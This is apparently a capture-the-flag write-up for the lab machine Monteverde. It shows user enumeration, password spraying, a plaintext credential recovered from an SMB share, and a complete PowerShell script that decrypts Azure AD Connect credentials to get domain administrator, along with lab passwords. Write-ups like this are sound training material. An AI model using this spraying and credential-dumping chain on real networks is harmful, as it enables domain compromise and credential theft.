nmap scan

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49706/tcp open  unknown
49778/tcp open  unknown
```

### Enumerating SMB

```
smbclient -L \\10.10.10.172
Enter WORKGROUP\localuser's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```

We can't see shares without login

### Enumerating RPC

```
rpcclient -U "" -N 10.10.10.172
rpcclient $> enumdomusers 
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

### Password spraying

First I'll use crackmpacexe with a wordlist that is the same as the user list, if it fails I'll use rockyou.txt:

```
crackmapexec smb 10.10.10.172 -u user-list.txt -p pass.txt --continue-on-success
---
---
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
---
--
```

### Enumerating smb as SABatchJobs

```
smbclient -L \\10.10.10.172 -U SABatchJobs
Enter WORKGROUP\SABatchJobs's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        azure_uploads   Disk      
        C$              Disk      Default share
        E$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        users$          Disk      
SMB1 disabled -- no workgroup available
```

Let's check `$Users`:

```
smbclient -U SABatchJobs //10.10.10.172/Users$
smb: \> ls
  .                                   D        0  Fri Jan  3 05:12:48 2020
  ..                                  D        0  Fri Jan  3 05:12:48 2020
  dgalanos                            D        0  Fri Jan  3 05:12:30 2020
  mhope                               D        0  Fri Jan  3 05:41:18 2020
  roleary                             D        0  Fri Jan  3 05:10:30 2020
  smorgan                             D        0  Fri Jan  3 05:10:24 2020
```

On `mhope` folder there's a `azure.xml` file:

```
smb: \> cd mhope
smb: \mhope\> ls
  .                                   D        0  Fri Jan  3 05:41:18 2020
  ..                                  D        0  Fri Jan  3 05:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 05:40:23 2020

                524031 blocks of size 4096. 519955 blocks available
smb: \mhope\> get azure.xml
getting file \mhope\azure.xml of size 1212 as azure.xml (5.3 KiloBytes/sec) (average 5.3 KiloBytes/sec)
```

If we see the content we find this:

```
cat azure.xml 
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

We have this password: `4n0therD4y@n0th3r$` we can login with evil-winrm:

```
evil-winrm -i 10.10.10.172 -u mhope -p "4n0therD4y@n0th3r$"
```

### Privilege Escalation

We are member of azure admins:

```
whoami /groups
---
---
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
---
---
```

This user has access to the local SQL server db that has an encrypted password of the MSOL account, this ![blog](https://blog.xpnsec.com/azuread-connect-for-redteam/) explains

We have this script:

```
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=localhost;Database=ADSync;Integrated Security=sspi"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

Now let's upload it an run it:

```
*Evil-WinRM* PS C:\Users\mhope\documents> upload priv.ps1
*Evil-WinRM* PS C:\Users\mhope\documents> .\priv.ps1
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

And we have the password for the administrator account that we can login using evil-winrm

```
evil-winrm -i 10.10.10.172 -u administrator -p d0m@in4dminyeah!
```
